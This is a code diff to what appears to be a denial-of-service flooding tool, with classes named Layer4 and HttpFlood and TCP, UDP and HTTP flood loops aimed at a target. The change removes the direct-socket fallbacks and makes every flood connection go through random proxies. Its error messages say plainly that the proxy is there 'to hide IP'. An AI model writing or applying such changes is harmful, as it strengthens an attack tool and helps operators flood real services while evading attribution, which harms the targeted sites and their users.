@@ -529,6 +529,8 @@ class Layer4(Thread):
 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
+        if not self._proxies:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
         self.select(self._method)
         while self._synevent.is_set():
             self.SENT_FLOOD()
@@ -537,11 +539,10 @@ class Layer4(Thread):
                         conn_type=AF_INET,
                         sock_type=SOCK_STREAM,
                         proto_type=IPPROTO_TCP):
-        if self._proxies:
-            s = randchoice(self._proxies).open_socket(
-                conn_type, sock_type, proto_type)
-        else:
-            s = socket(conn_type, sock_type, proto_type)
+        if not self._proxies:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
+        s = randchoice(self._proxies).open_socket(
+            conn_type, sock_type, proto_type)
         s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         s.settimeout(.9)
         s.connect(self._target)
@@ -585,6 +586,8 @@ class Layer4(Thread):
             REQUESTS_SENT += 1
 
     def UDP(self) -> None:
+        if not self._proxies:
+            raise ConnectionError("No proxies available - UDP requires proxy to hide IP")
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
             try:
@@ -966,6 +969,8 @@ class HttpFlood(Thread):
                 
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
+        if not self._proxies:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
         self.select(self._method)
         while self._synevent.is_set():
             self.SENT_FLOOD()
@@ -992,12 +997,9 @@ class HttpFlood(Thread):
                            "\r\n"))
 
     def open_connection(self, host=None) -> socket:
-        if self._proxies:
-            sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
-        else:
-            if getattr(self, '_enforce_proxy', False):
-                raise ConnectionError("No proxies available - all connections must go through proxy")
-            sock = socket(AF_INET, SOCK_STREAM)
+        if not self._proxies:
+            raise ConnectionError("No proxies available - all connections must go through proxy")
+        sock = randchoice(self._proxies).open_socket(AF_INET, SOCK_STREAM)
 
         sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
         try:
